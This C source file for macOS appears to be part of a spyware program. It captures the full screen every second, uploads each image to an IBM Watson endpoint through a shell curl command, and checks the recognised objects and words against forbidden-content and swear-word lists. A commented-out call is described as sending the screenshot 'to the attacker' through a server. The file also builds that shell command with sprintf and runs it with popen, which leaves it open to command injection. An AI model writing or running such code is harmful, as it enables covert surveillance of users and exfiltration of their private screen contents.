#include "connection.h"
#include "screen_analyst.h"
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#include "data_analyzer.h"

void * start_capture_screenshots(){
	while(true){
		sleep(1); // sleep for one second in order to reduce srtes from the system
		capture_screenshot();
	}
	return NULL;
}

SCREENSHOT_STATUS capture_screenshot() {
	
	CGDirectDisplayID displays[MAX_DISPLAYS_NUM];
	uint32 count;
	
	if (CGGetActiveDisplayList(sizeof(displays)/sizeof(displays[0]), displays, &count) != kCGErrorSuccess) //failed to get display list
		return CAPTURE_FAILED;
		
	CGRect rect = CGRectNull;

	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
			continue;
		rect = CGRectUnion(rect, CGDisplayBounds(displays[i]));
	}

	CGColorSpaceRef colorspace = CGColorSpaceCreateWithName(kCGColorSpaceGenericRGB);
	if (!colorspace) // failed to create colorspace
		return CAPTURE_FAILED;
	
	CGContextRef cgcontext = CGBitmapContextCreate(NULL, CGRectGetWidth(rect), CGRectGetHeight(rect), 8, 0, colorspace,(CGBitmapInfo)kCGImageAlphaPremultipliedFirst);
	CGColorSpaceRelease(colorspace);
	if (!cgcontext) // failed to create bitmap context  	
		return CAPTURE_FAILED;
	
	CGContextClearRect(cgcontext, CGRectMake(0, 0, CGRectGetWidth(rect), CGRectGetHeight(rect)));

	for (uint32_t i = 0; i < count; i++){ // if display is secondary mirror of another display, skip it
		if (CGDisplayMirrorsDisplay(displays[i]) != kCGNullDirectDisplay)
			continue;

		CGRect displayRect = CGDisplayBounds(displays[i]);
		CGImageRef image = CGDisplayCreateImage(displays[i]);
		if (!image)
			continue;

		CGRect dest = CGRectMake(displayRect.origin.x - rect.origin.x, displayRect.origin.y - rect.origin.y, displayRect.size.width, displayRect.size.height);
		CGContextDrawImage(cgcontext, dest, image);
		CGImageRelease(image);
	}

	CGImageRef image = CGBitmapContextCreateImage(cgcontext);
	CGContextRelease(cgcontext);
	if (!image) // failed to create image from bitmap context
		return CAPTURE_FAILED;
		
	CFURLRef url = CFURLCreateWithFileSystemPath(NULL, CFSTR(SCREENSHOT_IMAGE_NAME), kCFURLPOSIXPathStyle, 0);
	if (!url) // failed to create URL
		return CAPTURE_FAILED;

	CGImageDestinationRef dest = CGImageDestinationCreateWithURL(url, kUTTypeJPEG, 1, NULL);
	
	CFRelease(url);
	if (!dest) //failed to create image destination
		return CAPTURE_FAILED;
	
	CGImageDestinationAddImage(dest, image, NULL);
	CGImageRelease(image);
	
	if (!CGImageDestinationFinalize(dest)) //failed to finalize image destination
		return CAPTURE_FAILED;
		
	CFRelease(dest);
	screen_classification_and_ocr_analyzer(SCREENSHOT_IMAGE_NAME, IBM_CLOUD_APIKEY);
//	send_file(SCREENSHOT_IMAGE_NAME, GET_SCREEN_STREAM, true); //  send the screenshot to the attacker through the servre

	return CAPTURE_SUCCESSFULLY;
}

void screen_classification_and_ocr_analyzer(char * image_path, char * apikey){
	int classifications_count = 0;
	int ocr_words_count = 0;
	char IBM_watson_classification_and_ocr_command[400];
	char line_buffer[90];
	char * curr_recognition_result;
	FILE * screen_recognition_result_fd;
	
	sprintf(IBM_watson_classification_and_ocr_command, "curl --silent -X POST -u \"apikey:%s\" -F \"images_file=@%s\" \"https://gateway.watsonplatform.net/visual-recognition/api/v3/recognize_text?version=2018-03-19\" \"https://gateway.watsonplatform.net/visual-recognition/api/v3/classify?version=2018-03-19\" -F \"threshold=0.7\"", apikey, image_path);
	screen_recognition_result_fd = popen(IBM_watson_classification_and_ocr_command, "r");
	
	while (fgets(line_buffer, sizeof(line_buffer), screen_recognition_result_fd) != NULL) {
		// create classifications array
		if (strstr(line_buffer, "\"class\"") != NULL){
			curr_recognition_result = strtok(line_buffer, "\""); // removing the rest of the result
			curr_recognition_result = strtok(NULL, "\"");
			curr_recognition_result = strtok(NULL, "\"");
			curr_recognition_result = strtok(NULL, "\"");
			#ifdef USER_MESSAGE_PROMPT
				printf("classification : %s\n", curr_recognition_result);
			#endif
			check_for_forbidden_content(curr_recognition_result, "saw", forbidden_screen_contents_array, num_of_forbidden_screen_contents);
		}
		else if (strstr(line_buffer, "\"word\"") != NULL){
			curr_recognition_result = strtok(line_buffer, "\""); // removing the rest of the result
			curr_recognition_result = strtok(NULL, "\"");
			curr_recognition_result = strtok(NULL, "\"");
			curr_recognition_result = strtok(NULL, "\"");
			#ifdef USER_MESSAGE_PROMPT
				printf("word : %s\n", curr_recognition_result);
			#endif
			check_for_forbidden_content(curr_recognition_result, "read", swear_words_array, num_of_swear_words);
		}
	}	
	pclose(screen_recognition_result_fd);
}